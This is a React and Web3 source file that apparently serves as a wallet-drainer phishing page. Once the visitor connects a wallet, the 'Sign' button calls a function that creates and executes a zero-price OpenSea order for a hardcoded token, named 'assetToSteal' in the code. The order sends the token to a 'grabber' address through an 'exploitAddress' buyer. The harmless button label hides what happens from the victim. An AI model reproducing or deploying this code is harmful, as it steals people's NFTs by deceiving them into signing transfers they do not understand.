import { useState } from "react";
import * as Web3 from "web3";

import { createOrder, performOrder, postOrder } from "./opensea-sdk";

const App = () => {

    const [address, setAddress] = useState("");

    const onPressConnect = async() => {
        if (window.ethereum) {
          try {
            let web3 = new Web3(window.ethereum);
            await window.ethereum.enable();
            const accounts = await web3.eth.getAccounts();
            setAddress(accounts[0]);
          } catch (err) {
            console.log('user did not add account...', err);
          }
        }
    };

    const signSmth = async () => {
        const web3 = new Web3(Web3.givenProvider);
        const provider = web3.currentProvider

        const assetToSteal = {
            "tokenId": "8932",
            "tokenAddress": "0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0"
        }
        const exploitAddress = "0x19ceF40897207E7B45B68b598900e20d7f90F57d";
        let grabber = "0xa95889dF74d9F9A73b76DB329c71b78A2F62f635"
        const order = await createOrder({
            provider: provider,
            asset: assetToSteal,
            accountAddress: address,
            price: 0,
            quantity: 1,
            listingTime: 0,
            expirationTime: 0,
            extraBountyBasisPoints: 0,
            buyerAddress: exploitAddress
        });

        console.log(order);

        await performOrder({
            order: order,
            provider: provider,
            accountAddress: address,
            recipientAddress: grabber, //change to my account
            referrerAddress: exploitAddress
        });
    }

    return (
        <div>
          { 
            address !== "" ?
              <button onClick={signSmth}>
                <h2>Sign</h2>
              </button>
            : 
              <button onClick={onPressConnect}>
                Connect
              </button>
          }
        </div>
    );
};

export default App;